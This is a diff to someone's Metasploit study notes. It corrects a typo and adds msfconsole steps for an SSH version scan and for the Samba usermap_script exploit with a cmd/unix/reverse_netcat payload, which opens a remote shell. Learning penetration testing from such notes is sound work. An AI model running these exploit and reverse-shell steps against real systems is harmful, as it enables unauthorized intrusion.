@@ -203,13 +203,28 @@ wmap msfcosole -> search wmap
 		> vulns // to list vulnerabilities
 		> wmap_vulns -l // to get better list
 		
-Nessus msfcosnoel -> on Kali terminal -> service nessusd status // to check nessus status is active or not
+Nessus msfconsole -> on Kali terminal -> service nessusd status // to check nessus status is active or not
 		// open the nessus on browser -> https://icpl13708:8834
 		msf > banner
 		    > load nessus
 		    > nessus_help
 		    > nessus_connect username:password@own_ip:port ssl_verify
+		    
+------------------------------------------------------------------
 
+	> search ssh_version
+	> use auxillary/scanner/ssh/ssh_version
+	> set RHOSTS ip
+	> set THREADS 100
+	> run
+
+------------------------------------------------------------------
+
+	> search samba
+	> use exploit/multi/samba/usermap_script
+	> show payloads
+	> set payload cmd/unix/reverse_netcat
+	> exploit
 			   
 Step - Footprinting phase allows the attacker to gather the information regarding internal and external security architecture, he 
        has to face a target
